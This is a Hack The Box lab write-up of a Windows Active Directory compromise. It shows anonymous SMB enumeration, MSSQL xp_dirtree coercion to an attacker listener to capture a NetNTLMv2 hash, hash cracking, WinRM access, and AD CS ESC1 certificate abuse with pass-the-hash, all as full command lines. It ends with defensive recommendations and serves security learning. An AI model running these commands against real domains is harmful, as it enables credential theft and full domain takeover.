---
title: "AD CS ESC1 Through Anonymous SMB and MSSQL Coercion"
description: "Anonymous SMB and MSSQL coercion recover credentials, then AD CS ESC1 certificate abuse yields the privileged account NT hash."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - mssql
  - smb
---

## Summary

This Hack The Box Windows Active Directory lab is in the `<LAB_DOMAIN>` domain. Anonymous SMB access exposes a PDF containing temporary MSSQL service credentials. MSSQL is abused with `xp_dirtree` to coerce NetNTLMv2 authentication from the service account, which cracks to a usable password. Host log review reveals credentials for `<DOMAIN_USER>`, granting WinRM access. Privilege escalation abuses AD CS ESC1 by requesting a certificate for `<PRIVILEGED_USER>` through a vulnerable template and using PKINIT to recover the privileged-account NT hash. All credential values, target addresses, and sensitive output are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows Server (Active Directory domain controller for `<LAB_DOMAIN>`)
- **Services exposed:** DNS (53), Kerberos (88), LDAP (389), SMB (445), MSSQL (1433), WinRM (5985)
- **Objective:** Achieve full compromise through the attack surface presented by exposed services
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: the host runs six distinct services on a single IP. DNS, Kerberos, LDAP, and SMB indicate an Active Directory domain controller. MSSQL is exposed directly. WinRM is available for remote management.

Action: targeted version/script scan of representative ports.

```bash
nmap -sC -sV -oA <OUT_PREFIX> <TARGET_IP>
```

Representative output:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          <LAB_DOMAIN>
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server
5985/tcp open  winrm
```

Technical significance: the combination of Kerberos, LDAP, and SMB confirms a domain controller. MSSQL on a DC is unusual and expands the attack surface. WinRM indicates a potential remote shell path once valid credentials are obtained.

### 2. SMB Anonymous Share Enumeration

Observation: anonymous SMB access yields a readable `Public` share containing a single PDF file. The PDF discloses temporary SQL credentials.

Action: enumerate shares, then review accessible content.

```bash
nxc smb <TARGET_IP> -u '<ANON_USER>' -p '' --shares
```

Representative output:

```text
Public   READ
IPC$     READ
NETLOGON READ
SYSVOL   READ
```

The `Public` share contains:

```text
SQL Server Procedures.pdf
```

The PDF discloses temporary SQL credentials:

```text
<DB_USER> : <DB_PASSWORD>
```

Technical significance: anonymous SMB is a common misconfiguration on Windows environments. A PDF containing credentials indicates operational documentation was placed on a shared drive without access controls. The disclosed credential is usable against MSSQL.

### 3. MSSQL NTLM Coercion

Observation: the recovered credential authenticates to MSSQL as `PublicUser`. The `xp_dirtree` extended stored procedure coerces the SQL service account into authenticating to an attacker-controlled SMB listener, leaking its NetNTLMv2 hash.

Action: capture the NTLMv2 hash using a responder listener, then trigger authentication via MSSQL.

```bash
sudo responder -I <INTERFACE>
```

```bash
impacket-mssqlclient <LAB_DOMAIN>/<DB_USER>:'<DB_PASSWORD>'@<DOMAIN_CONTROLLER>
```

```sql
EXEC xp_dirtree '\\<ATTACKER_IP>\pwnd'
```

The SQL service account's NetNTLMv2 hash is captured. Crack it offline:

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST>
```

Recovered credential:

```text
<SQL_SVC_USER> : <SQL_SVC_PASSWORD>
```

Technical significance: `xp_dirtree` is a documented SQL Server feature that lists directory contents. When it resolves a UNC path, the SQL Server service account initiates an SMB connection to the specified host, leaking its NTLMv2 hash. This is a reliable coercion primitive when outbound SMB is permitted from the SQL host.

### 4. Host Log Credential Discovery

Observation: BloodHound enumeration with `<SQL_SVC_USER>` credentials does not yield a direct path. However, SQL-accessible files include a backup error log at `C:\SQLServer\Logs\ERRORLOG.BAK`. The log contains failed login attempts that reveal a likely mistyped password for `<DOMAIN_USER>`.

Action: enumerate accessible files via MSSQL, then read the error log.

```bash
nxc smb <LAB_DOMAIN> -u '<SQL_SVC_USER>' -p '<SQL_SVC_PASSWORD>'
```

The recovered credentials validate against SMB:

```text
[+] <LAB_DOMAIN>\<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>
```

Technical significance: SQL Server error logs record authentication events. A failed login attempt with a near-correct password suggests a mistyped credential. This is a common source of credential leakage in environments where developers or administrators connect to SQL interactively and mistype passwords that get logged.

### 5. WinRM Access as <DOMAIN_USER>

Observation: the recovered credential works for WinRM, granting an interactive PowerShell session as `<DOMAIN_USER>`. The user flag is available from the desktop.

Action: establish a remote session.

```bash
evil-winrm -i <TARGET_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PASSWORD>'
```

Representative output:

```text
*Evil-WinRM* PS C:\Users\<DOMAIN_USER>\Desktop>
```

Technical significance: WinRM provides a native PowerShell remoting interface. Unlike a reverse shell, it runs in the context of the authenticated user without dropping to a CMD prompt, making it a clean and stable access method. The user flag confirms user-level access.

### 6. AD CS ESC1 — Certificate Abuse for <PRIVILEGED_USER>

Observation: `<DOMAIN_USER>` is a member of `Certificate Service DCOM Access`. The domain hosts an Enterprise CA (`<CERTIFICATE_AUTHORITY>`). Certipy identifies an ESC1-vulnerable template: `UserAuthentication` allows Domain Users to enroll, the enrollee supplies the subject, and the template enables client authentication.

Action: enumerate vulnerable templates, request a certificate for `<PRIVILEGED_USER>`, then authenticate with PKINIT.

```bash
certipy find \
  -u '<DOMAIN_USER>' \
  -p '<DOMAIN_USER_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -target-ip <TARGET_IP> \
  -vulnerable -stdout -enable
```

Representative finding:

```text
ESC1: Domain Users can enroll,
enrollee supplies subject,
template allows client authentication
```

Request a certificate for `<PRIVILEGED_USER>`:

```bash
certipy req \
  -dc-ip <TARGET_IP> \
  -u '<DOMAIN_USER>' \
  -p '<DOMAIN_USER_PASSWORD>' \
  -ca '<CA_NAME>' \
  -template 'UserAuthentication' \
  -upn <PRIVILEGED_USER>@<LAB_DOMAIN>
```

Authenticate with the PFX and recover the NT hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
```

Representative output:

```text
Got hash for '<PRIVILEGED_USER>@<LAB_DOMAIN>':
aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT_HASH>
```

Pass the hash:

```bash
evil-winrm -i <TARGET_IP> -u <PRIVILEGED_USER> -H <PRIVILEGED_USER_NT_HASH>
```

Representative output:

```text
*Evil-WinRM* PS C:\Users\<PRIVILEGED_USER>\Desktop>
```

Technical significance: AD CS ESC1 exploits a template configuration where (1) low-privileged users can enroll, (2) the enrollee controls the subject field, and (3) the template permits client authentication. An attacker requests a certificate impersonating a privileged account, then uses PKINIT to authenticate as that account. The `Certificate Service DCOM Access` group membership grants the necessary enrollment rights. This chain converts ordinary domain user access into full domain administrator control without exploiting any software vulnerability — it is a configuration abuse.

## Challenges and Decisions

- BloodHound enumeration with `sql_svc` did not surface a direct attack path. The breakthrough came from reviewing SQL-accessable host logs, an enumeration step outside the typical BloodHound-driven workflow.
- The certificate template `UserAuthentication` appeared non-obvious in standard enumeration. The `-vulnerable` flag in Certipy was needed to surface the ESC1 misconfiguration.
- The NT hash was recovered through PKINIT authentication, not password cracking. This demonstrates that certificate-based authentication can yield credential material that password-based attacks cannot.

## Outcome

The evidence establishes a complete compromise chain from anonymous SMB access to full domain administrator control. Every stage abused legitimate Windows/AD functionality that was misconfigured: anonymous file sharing, MSSQL extended stored procedures, password logging in error logs, and AD CS certificate template misconfiguration. No software vulnerabilities were exploited.

## Lessons and Recommendations

- Restrict anonymous access to SMB shares. Operational documents containing credentials should never be placed on publicly accessible shares.
- Audit MSSQL extended stored procedures that perform file system operations. `xp_dirtree`, `xp_fileexist`, and similar procedures can coerce NTLM authentication.
- Review SQL Server error log permissions. Backup logs may contain sensitive authentication data and should not be accessible to low-privileged SQL accounts.
- Audit AD CS certificate templates for ESC1 conditions: enrollee-controlled subject, low-privileged enrollment rights, and client authentication enabled. These three conditions together allow domain-wide impersonation.
- Monitor certificate enrollment activity for unusual UPN requests, particularly those targeting privileged accounts.
- Implement tiered administration to prevent service accounts and standard users from accessing domain controller resources directly.

## References

- Hack The Box retired Windows machine — [Escape](https://app.hackthebox.com/machines/Escape)
